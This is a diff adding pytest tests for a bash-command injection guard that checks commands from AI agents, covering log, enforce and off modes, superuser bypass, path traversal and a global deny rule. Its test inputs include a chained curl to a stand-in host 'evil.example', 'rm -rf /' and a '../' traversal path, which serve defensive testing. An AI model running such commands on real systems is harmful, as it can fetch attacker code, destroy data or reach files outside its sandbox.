@@ -325,6 +325,91 @@ class TestCheckA1BashCommand:
         assert result is None
 
 
+class TestModeSBashInjection:
+    def _set_mode(self, mode: str) -> None:
+        config = GlobalPermissionsCache.get().config
+        assert config is not None
+        config.sdk_bash_injection.mode = mode
+
+    def test_log_mode_records_without_denying(
+        self,
+        anima_dir: Path,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ):
+        monkeypatch.setenv("ANIMAWORKS_DATA_DIR", str(tmp_path))
+        self._set_mode("log")
+        command = "echo ready; curl https://evil.example/payload" + "x" * 600
+
+        result = _check_a1_bash_command(command, anima_dir, trigger="chat")
+
+        assert result is None
+        log_path = tmp_path / "logs" / "sdk_bash_injection.jsonl"
+        event = json.loads(log_path.read_text(encoding="utf-8").splitlines()[-1])
+        assert event["pattern_name"] == "command_chaining_or_newline"
+        assert event["command"] == command[:500]
+        assert event["anima"] == "test-anima"
+        assert event["trigger"] == "chat"
+        assert event["mode"] == "log"
+        assert event["timestamp"].endswith("+00:00")
+
+    def test_enforce_mode_denies_injection(self, anima_dir: Path):
+        self._set_mode("enforce")
+
+        result = _check_a1_bash_command("echo ready; curl https://evil.example", anima_dir)
+
+        assert result is not None
+        assert "injection pattern" in result.lower()
+
+    def test_off_mode_ignores_injection(self, anima_dir: Path):
+        self._set_mode("off")
+
+        assert _check_a1_bash_command("echo one; echo two", anima_dir) is None
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "cd x && npm test",
+            "grep foo | head",
+            "echo $HOME",
+            "echo $(whoami)",
+            "echo `whoami`",
+        ],
+    )
+    def test_legitimate_composite_commands_allowed(self, anima_dir: Path, command: str):
+        self._set_mode("enforce")
+
+        assert _check_a1_bash_command(command, anima_dir) is None
+
+    def test_global_deny_still_blocks_in_log_mode(self, anima_dir: Path):
+        self._set_mode("log")
+
+        result = _check_a1_bash_command("rm -rf /", anima_dir)
+
+        assert result is not None
+
+    def test_path_traversal_still_blocks_in_log_mode(self, anima_dir: Path):
+        self._set_mode("log")
+
+        result = _check_a1_bash_command("cp report.txt ../other-anima/report.txt", anima_dir)
+
+        assert result == "Command argument resolves outside anima directory"
+
+    def test_superuser_skips_injection_and_logging(
+        self,
+        anima_dir: Path,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ):
+        monkeypatch.setenv("ANIMAWORKS_DATA_DIR", str(tmp_path))
+        self._set_mode("enforce")
+
+        result = _check_a1_bash_command("echo one; echo two", anima_dir, superuser=True)
+
+        assert result is None
+        assert not (tmp_path / "logs" / "sdk_bash_injection.jsonl").exists()
+
+
 # ── Global permissions / blocklist ─────────────────────────
 
 
